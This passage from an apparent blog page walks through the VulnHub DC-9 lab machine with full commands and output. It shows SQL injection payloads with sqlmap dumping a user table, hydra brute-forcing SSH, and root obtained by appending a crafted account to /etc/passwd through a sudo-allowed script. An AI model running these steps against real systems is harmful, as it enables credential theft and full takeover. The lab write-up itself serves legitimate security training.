class="hljs-number">192.168</span>.<span class="hljs-number">122.20</span><br>Host is up (<span class="hljs-number">0.0041</span>s latency).<br><br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp open  ssh<br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">04</span>:A2:<span class="hljs-number">19</span> (VMware)<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.82</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>Well, it worked.</p>
+<p>Now we can access SSH service, however there’s nothing useful about valid accounts XD.</p>
+<p>Let’s move back to sqlmap and check User database.</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">┌──(root㉿kali)-[/usr/share/wordlists/wfuzz]<br>└─<span class="hljs-comment"># sqlmap -r /root/Desktop/vulnhub/DC-9/DC9 --random-agent --dbms=mysql -D users -T UserDetails -C username,password --dump</span><br>        ___<br>       __H__                                                                                                                                                                                                      <br> ___ ___[)]_____ ___ ___  &#123;1.7.8<span class="hljs-comment">#stable&#125;                                                                                                                                                                          </span><br>|<span class="hljs-string">_ -</span>|<span class="hljs-string"> . [&quot;]     </span>|<span class="hljs-string"> .&#x27;</span>|<span class="hljs-string"> . </span>|<span class="hljs-string">                                                                                                                                                                                         </span><br><span class="hljs-string"></span>|<span class="hljs-string">___</span>|<span class="hljs-string">_  [&quot;]_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">__,</span>|<span class="hljs-string">  _</span>|<span class="hljs-string">                                                                                                                                                                                         </span><br><span class="hljs-string">      </span>|<span class="hljs-string">_</span>|<span class="hljs-string">V...       </span>|<span class="hljs-string">_</span>|<span class="hljs-string">   https://sqlmap.org                                                                                                                                                                      </span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] starting @ 22:27:02 /2023-11-13/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[22:27:02] [INFO] parsing HTTP request from &#x27;/root/Desktop/vulnhub/DC-9/DC9&#x27;</span><br><span class="hljs-string">[22:27:02] [INFO] fetched random HTTP User-Agent header value &#x27;Opera/9.61 (X11; Linux i686; U; ru) Presto/2.1.1&#x27; from file &#x27;/usr/share/sqlmap/data/txt/user-agents.txt&#x27;</span><br><span class="hljs-string">[22:27:02] [INFO] testing connection to the target URL</span><br><span class="hljs-string">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="hljs-string">---</span><br><span class="hljs-string">Parameter: search (POST)</span><br><span class="hljs-string">    Type: time-based blind</span><br><span class="hljs-string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="hljs-string">    Payload: search=1&#x27; AND (SELECT 9453 FROM (SELECT(SLEEP(5)))KFpZ) AND &#x27;pTLE&#x27;=&#x27;pTLE</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Type: UNION query</span><br><span class="hljs-string">    Title: Generic UNION query (NULL) - 6 columns</span><br><span class="hljs-string">    Payload: search=1&#x27; UNION ALL SELECT NULL,CONCAT(0x7170716271,0x50787558766b6c786b7663596d6f6b6f4d455975546751527162447053714a504b52776368594e6e,0x716a787171),NULL,NULL,NULL,NULL-- -</span><br><span class="hljs-string">---</span><br><span class="hljs-string">[22:27:02] [INFO] testing MySQL</span><br><span class="hljs-string">[22:27:02] [INFO] confirming MySQL</span><br><span class="hljs-string">[22:27:02] [INFO] the back-end DBMS is MySQL</span><br><span class="hljs-string">web server operating system: Linux Debian 10 (buster)</span><br><span class="hljs-string">web application technology: Apache 2.4.38</span><br><span class="hljs-string">back-end DBMS: MySQL &gt;= 5.0.0 (MariaDB fork)</span><br><span class="hljs-string">[22:27:02] [INFO] fetching entries of column(s) &#x27;password,username&#x27; for table &#x27;UserDetails&#x27; in database &#x27;users&#x27;</span><br><span class="hljs-string">Database: users</span><br><span class="hljs-string">Table: UserDetails</span><br><span class="hljs-string">[17 entries]</span><br><span class="hljs-string">+-----------+---------------+</span><br><span class="hljs-string"></span>|<span class="hljs-string"> username  </span>|<span class="hljs-string"> password      </span>|<br>+-----------+---------------+<br>|<span class="hljs-string"> marym     </span>|<span class="hljs-string"> 3kfs86sfd     </span>|<br>|<span class="hljs-string"> julied    </span>|<span class="hljs-string"> 468sfdfsd2    </span>|<br>|<span class="hljs-string"> fredf     </span>|<span class="hljs-string"> 4sfd87sfd1    </span>|<br>|<span class="hljs-string"> barneyr   </span>|<span class="hljs-string"> RocksOff      </span>|<br>|<span class="hljs-string"> tomc      </span>|<span class="hljs-string"> TC&amp;TheBoyz    </span>|<br>|<span class="hljs-string"> jerrym    </span>|<span class="hljs-string"> B8m#48sd      </span>|<br>|<span class="hljs-string"> wilmaf    </span>|<span class="hljs-string"> Pebbles       </span>|<br>|<span class="hljs-string"> bettyr    </span>|<span class="hljs-string"> BamBam01      </span>|<br>|<span class="hljs-string"> chandlerb </span>|<span class="hljs-string"> UrAG0D!       </span>|<br>|<span class="hljs-string"> joeyt     </span>|<span class="hljs-string"> Passw0rd      </span>|<br>|<span class="hljs-string"> rachelg   </span>|<span class="hljs-string"> yN72#dsd      </span>|<br>|<span class="hljs-string"> rossg     </span>|<span class="hljs-string"> ILoveRachel   </span>|<br>|<span class="hljs-string"> monicag   </span>|<span class="hljs-string"> 3248dsds7s    </span>|<br>|<span class="hljs-string"> phoebeb   </span>|<span class="hljs-string"> smellycats    </span>|<br>|<span class="hljs-string"> scoots    </span>|<span class="hljs-string"> YR3BVxxxw87   </span>|<br>|<span class="hljs-string"> janitor   </span>|<span class="hljs-string"> Ilovepeepee   </span>|<br>|<span class="hljs-string"> janitor2  </span>|<span class="hljs-string"> Hawaii-Five-0 </span>|<br>+-----------+---------------+<br><br>[22:27:02] [INFO] table &#x27;users.UserDetails&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.122.20/dump/users/UserDetails.csv&#x27;<br>[22:27:02] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.122.20&#x27;<br><br>[<span class="hljs-symbol">*</span>] ending @ 22:27:02 /2023-11-13/<br></code></pre></td></tr></table></figure>
+
+<p>I utilized cut command to organize the data from the database into “user” and “pass” files for subsequent brute-force attacks.</p>
+<p><img src="/2023/04/27/file-upload/image-20231114114012641.png" srcset="/img/loading.gif" lazyload alt="image-20231114114012641"></p>
+<p>hydra:</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">┌──(root㉿kali)-[~/Desktop/vulnhub/DC<span class="hljs-number">-9</span>]<br>└─# hydra -L user -P pass <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span> ssh <br>Hydra v9<span class="hljs-number">.5</span> (c) <span class="hljs-number">2023</span> by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> use <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (<span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> non-binding, these *** ignore laws <span class="hljs-keyword">and</span> ethics anyway).<br><br>Hydra (https:<span class="hljs-comment">//github.com/vanhauser-thc/thc-hydra) starting at 2023-11-13 22:41:38</span><br><span class="hljs-string">[WARNING]</span> Many SSH configurations limit the number of parallel tasks, it <span class="hljs-keyword">is</span> recommended to reduce the tasks: use -t <span class="hljs-number">4</span><br><span class="hljs-string">[WARNING]</span> Restorefile (ignored ...) <span class="hljs-keyword">from</span> a previous session found, to prevent overwriting, ./hydra.restore<br><span class="hljs-string">[DATA]</span> max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">391</span> login tries (l:<span class="hljs-number">17</span>/p:<span class="hljs-number">23</span>), ~<span class="hljs-number">25</span> tries per task<br><span class="hljs-string">[DATA]</span> attacking ssh:<span class="hljs-comment">//192.168.122.20:22/</span><br><span class="hljs-string">[22]</span>[ssh] host: <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span>   login: chandlerb   password: UrAG0D!<br><span class="hljs-string">[22]</span>[ssh] host: <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span>   login: joeyt   password: Passw0rd<br><span class="hljs-string">[STATUS]</span> <span class="hljs-number">357.00</span> tries/min, <span class="hljs-number">357</span> tries <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>:<span class="hljs-number">01</span>h, <span class="hljs-number">35</span> to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>:<span class="hljs-number">01</span>h, <span class="hljs-number">15</span> active<br><span class="hljs-string">[22]</span>[ssh] host: <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span>   login: janitor   password: Ilovepeepee<br><span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">3</span> valid passwords found<br><span class="hljs-string">[WARNING]</span> Writing restore file because <span class="hljs-number">1</span> <span class="hljs-keyword">final</span> worker threads did <span class="hljs-keyword">not</span> complete until end.<br><span class="hljs-string">[ERROR]</span> <span class="hljs-number">1</span> target did <span class="hljs-keyword">not</span> resolve <span class="hljs-keyword">or</span> could <span class="hljs-keyword">not</span> be connected<br><span class="hljs-string">[ERROR]</span> <span class="hljs-number">0</span> target did <span class="hljs-keyword">not</span> complete<br>Hydra (https:<span class="hljs-comment">//github.com/vanhauser-thc/thc-hydra) finished at 2023-11-13 22:42:46</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>chandlerb&#x2F;UrAG0D!</li>
+<li>joeyt&#x2F;Passw0rd</li>
+<li>janitor&#x2F;Ilovepeepee</li>
+</ul>
+<p>I logged in all three accounts and finally found something interesting with user janitor:</p>
+<p><img src="/2023/04/27/file-upload/image-20231114115006218.png" srcset="/img/loading.gif" lazyload alt="image-20231114115006218"></p>
+<p>check this directory:</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">janitor<span class="hljs-variable">@dc</span><span class="hljs-number">-9</span><span class="hljs-symbol">:~/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>ls<br>passwords-found-on-post-it-notes.txt<br>janitor<span class="hljs-variable">@dc</span><span class="hljs-number">-9</span><span class="hljs-symbol">:~/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>cat passwords-found-on-post-it-notes.txt <br><span class="hljs-title class_">BamBam01</span><br><span class="hljs-title class_">Passw0rd</span><br>smellycats<br><span class="hljs-title class_">P0Lic</span><span class="hljs-comment">#10-4</span><br><span class="hljs-title class_">B4</span>-<span class="hljs-title class_">Tru3</span><span class="hljs-number">-001</span><br><span class="hljs-number">4</span>uGU5T-<span class="hljs-title class_">NiGHts</span><br></code></pre></td></tr></table></figure>
+
+<p>some new passwords! Add to our pass list and try hydra again:</p>
+<p><img src="/2023/04/27/file-upload/image-20231114115744136.png" srcset="/img/loading.gif" lazyload alt="image-20231114115744136"></p>
+<p>We got a new user fredf.</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs elixir">fredf<span class="hljs-variable">@dc</span><span class="hljs-number">-9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>ls -al /home/fredf/<br>total <span class="hljs-number">12</span><br>drwx------  <span class="hljs-number">3</span> fredf fredf <span class="hljs-number">4096</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">14</span> <span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span> .<br>drwxr-xr-x <span class="hljs-number">19</span> root  root  <span class="hljs-number">4096</span> <span class="hljs-title class_">Dec</span> <span class="hljs-number">29</span>  <span class="hljs-number">2019</span> ..<br>lrwxrwxrwx  <span class="hljs-number">1</span> fredf fredf    <span class="hljs-number">9</span> <span class="hljs-title class_">Dec</span> <span class="hljs-number">29</span>  <span class="hljs-number">2019</span> .bash_history -&gt; /dev/null<br>drwx------  <span class="hljs-number">3</span> fredf fredf <span class="hljs-number">4096</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">14</span> <span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span> .gnupg<br>fredf<span class="hljs-variable">@dc</span><span class="hljs-number">-9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> fredf on dc<span class="hljs-number">-9</span>:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span><br><br><span class="hljs-title class_">User</span> fredf may run the following commands on dc<span class="hljs-number">-9</span>:<br>    (root) <span class="hljs-symbol">NOPASSWD:</span> /opt/devstuff/dist/test/test<br></code></pre></td></tr></table></figure>
+
+<p>It’s evident that we can execute &#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test&#x2F;test in root privilege.</p>
+<p>Let’s dig deeper.</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vim">fredf@dc-<span class="hljs-number">9</span>:/home/janitor/.secrets-<span class="hljs-keyword">for</span>-putin$ /<span class="hljs-keyword">opt</span>/devstuff/dist/test/test<br>Usage: <span class="hljs-keyword">python</span> test.<span class="hljs-keyword">py</span> <span class="hljs-keyword">read</span> <span class="hljs-keyword">append</span><br>fredf@dc-<span class="hljs-number">9</span>:/home/janitor/.secrets-<span class="hljs-keyword">for</span>-putin$ <span class="hljs-keyword">find</span> / -name test.<span class="hljs-keyword">py</span> -<span class="hljs-built_in">type</span> <span class="hljs-keyword">f</span> <span class="hljs-number">2</span>&gt;/dev/null <br>/<span class="hljs-keyword">opt</span>/devstuff/test.<span class="hljs-keyword">py</span><br>/usr/lib/<span class="hljs-keyword">python3</span>/dist-packages/setuptools/<span class="hljs-keyword">command</span>/test.<span class="hljs-keyword">py</span><br>fredf@dc-<span class="hljs-number">9</span>:/home/janitor/.secrets-<span class="hljs-keyword">for</span>-putin$ <span class="hljs-keyword">cat</span> /<span class="hljs-keyword">opt</span>/devstuff/test.<span class="hljs-keyword">py</span><br>#!/usr/bin/<span class="hljs-keyword">python</span><br><br>import sys<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span> (sys.<span class="hljs-built_in">argv</span>) != <span class="hljs-number">3</span> :<br>    <span class="hljs-keyword">print</span> (<span class="hljs-string">&quot;Usage: python test.py read append&quot;</span>)<br>    sys.<span class="hljs-keyword">exit</span> (<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">else</span> :<br>    <span class="hljs-keyword">f</span> = <span class="hljs-keyword">open</span>(sys.<span class="hljs-built_in">argv</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;r&quot;</span>)<br>    output = (<span class="hljs-keyword">f</span>.<span class="hljs-keyword">read</span>())<br><br>    <span class="hljs-keyword">f</span> = <span class="hljs-keyword">open</span>(sys.<span class="hljs-built_in">argv</span>[<span class="hljs-number">2</span>], <span class="hljs-string">&quot;a&quot;</span>)<br>    <span class="hljs-keyword">f</span>.<span class="hljs-keyword">write</span>(output)<br>    <span class="hljs-keyword">f</span>.<span class="hljs-keyword">close</span>()<br></code></pre></td></tr></table></figure>
+
+<p>It seems that test.py file is the “key” to the root. Test.py is used to append the content of file A to another file B(root privilege). The most direct approach is to modify &#x2F;etc&#x2F;passwd.</p>
+<p>generate the passwd:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(root㉿kali)-[~<span class="hljs-regexp">/Desktop/</span>vulnhub/DC-<span class="hljs-number">9</span>]<br>└─<span class="hljs-comment"># openssl passwd -1 -salt ry4n 123456</span><br><span class="hljs-variable">$1</span><span class="hljs-variable">$ry4n</span><span class="hljs-variable">$S75u7SLn8eSw62A1NbqTj</span>/<br></code></pre></td></tr></table></figure>
+
+<p>append user to &#x2F;etc&#x2F;passwd file:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ruby">fredf<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>echo <span class="hljs-string">&#x27;ry4n:$1$ry4n$S75u7SLn8eSw62A1NbqTj/:0:0::/root:/usr/bin/bash&#x27;</span> &gt; <span class="hljs-regexp">/tmp/ry</span>4n<br>fredf<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>sudo /opt/devstuff/dist/test/test /tmp/ry4n /etc/passwd<br>fredf<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>su ry4n<br><span class="hljs-title class_">Password</span>: <br>root<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-comment"># id</span><br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br>root<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>ROOT IT!</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/vulnhub/">vulnhub</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/vulnhub/">vulnhub</a>
+                    
+                      <a class="hover-with-bg" href="/tags/walkthrough/">walkthrough</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/07/23/vulnhub_kioptrix_2014/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">vulnhub_kioptrix_2014</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/05/06/htb-armageddon/">
+                        <span class="hidden-mobile">htb_armageddon</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"MgDyY5XEdtIKIZHTxzy3GBJV-gzGzoHsz","appKey":"P8Ab9EN1clJmhpYHpamFEiD9","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
